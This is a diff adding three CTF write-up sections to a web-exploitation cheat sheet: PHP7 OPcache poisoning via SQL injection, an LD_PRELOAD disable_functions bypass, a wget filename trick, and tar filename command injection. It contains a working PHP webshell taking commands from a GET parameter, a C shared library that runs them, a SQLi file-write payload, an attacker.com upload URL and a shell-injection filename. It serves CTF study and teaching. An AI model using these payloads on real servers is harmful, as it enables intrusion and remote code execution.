@@ -29,6 +29,9 @@
 - [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
 - [Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)](#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016)
 - [Common Lisp Injection via Reader Macro (Insomnihack 2016)](#common-lisp-injection-via-reader-macro-insomnihack-2016)
+- [PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)](#php7-opcache-binary-webshell--ld_preload-disable_functions-bypass-alictf-2016)
+- [Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)](#wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016)
+- [Tar Filename Command Injection (CyberSecurityRumble 2016)](#tar-filename-command-injection-cybersecurityrumble-2016)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
@@ -445,6 +448,102 @@ Serialized Java objects in cookies/POST (starts with `rO0AB` / `aced0005`). Use 
 ## Race Conditions (TOCTOU)
 
 Concurrent requests bypass check-then-act patterns (balance, coupons, registration uniqueness). Send 50+ simultaneous requests so all see pre-modification state. See [server-side-deser.md](server-side-deser.md#race-conditions-toctou) for async exploit code and detection patterns.
+
+---
+
+---
+
+## PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)
+
+**Pattern (Homework):** Multi-stage chain: SQLi file write + PHP7 OPcache poisoning + `LD_PRELOAD` bypass of `disable_functions`.
+
+**Stage 1 — OPcache poisoning:**
+PHP7 with `opcache.file_cache` enabled stores compiled bytecode in `/tmp/OPcache/[system_id]/[webroot]/script.php.bin`. Replace the `.bin` file via SQLi `INTO DUMPFILE` to execute arbitrary PHP despite upload restrictions.
+
+```bash
+# 1. Calculate system_id from phpinfo() data
+python3 system_id_scraper.py http://target/phpinfo.php
+# Output: 39b005ad77428c42788140c6839e6201
+
+# 2. Generate opcode cache locally (match PHP version)
+php -d opcache.enable_cli=1 -d opcache.file_cache=/tmp/OPcache \
+    -d opcache.file_cache_only=1 -f payload.php
+
+# 3. Patch system_id in binary (bytes 9-40)
+# 4. Upload via SQLi INTO DUMPFILE:
+```
+```sql
+-1 UNION SELECT X'<hex_of_payload.php.bin>'
+INTO DUMPFILE '/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/evil.php.bin' #
+```
+
+**Stage 2 — LD_PRELOAD bypass:**
+When `disable_functions` blocks all exec functions, use `putenv()` + `mail()` to execute code. PHP's `mail()` calls external sendmail, which respects `LD_PRELOAD`.
+
+```c
+/* evil.c — compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+void payload(char *cmd) {
+    char buf[512];
+    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
+    system(buf);
+}
+
+int geteuid() {
+    if (getenv("LD_PRELOAD") == NULL) return 0;
+    unsetenv("LD_PRELOAD");
+    char *cmd = getenv("_evilcmd");
+    if (cmd) payload(cmd);
+    return 1;
+}
+```
+
+```php
+<?php
+// payload.php — upload evil.so via webapp, deploy this via OPcache
+putenv("LD_PRELOAD=/var/www/html/upload/evil.so");
+putenv("_evilcmd=" . $_GET['cmd']);
+mail("x@x.x", "", "", "");
+show_source("/tmp/_output.txt");
+?>
+```
+
+**Key insight:** PHP's `disable_functions` only restricts PHP-level calls. External programs spawned by `mail()` run without PHP restrictions, and `LD_PRELOAD` lets you override any libc function in those external programs. The OPcache `.bin` file has no integrity check beyond `system_id` matching — replacing it with a crafted binary gives arbitrary PHP execution even when upload validation strips PHP content.
+
+---
+
+## Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)
+
+**Pattern (trendyweb):** Server uses `wget` to download user-provided URLs and `parse_url()` to validate the path. Wget saves files with GET parameters in the filename, creating a `.php` extension bypass.
+
+```text
+URL: http://attacker.com/avatar.png?shell.php
+parse_url($url)['path'] = '/avatar.png'      # passes .png check
+wget saves as: avatar.png?shell.php           # server treats as PHP
+```
+
+Access via URL-encoded `?`: `http://target/data/hash/avatar.png%3fshell.php?cmd=id`
+
+**Key insight:** `wget` preserves GET parameters in the output filename when no `-O` flag is specified. `parse_url()` separates path from query, so validation only sees the path extension. The resulting file has a `.php` extension from the query string portion, which Apache/nginx interprets as PHP.
+
+---
+
+## Tar Filename Command Injection (CyberSecurityRumble 2016)
+
+**Pattern (Jobs):** Server extracts tar archives and displays filenames via a `.cgi` script. Filenames containing shell metacharacters are passed to shell without sanitization.
+
+```bash
+# Create tar with command injection filename
+mkdir exploit && cd exploit
+touch 'name; cat /flag #'
+tar cf exploit.tar *
+# Upload — server runs: echo "name; cat /flag #" in CGI context
+```
+
+**Key insight:** When server-side scripts process filenames from user-uploaded archives (tar, zip) via shell commands, special characters in filenames become injection vectors. The semicolon breaks out of the filename context, and `#` comments out trailing characters. Always sanitize filenames from untrusted archives before shell interpolation.
 
 ---
 
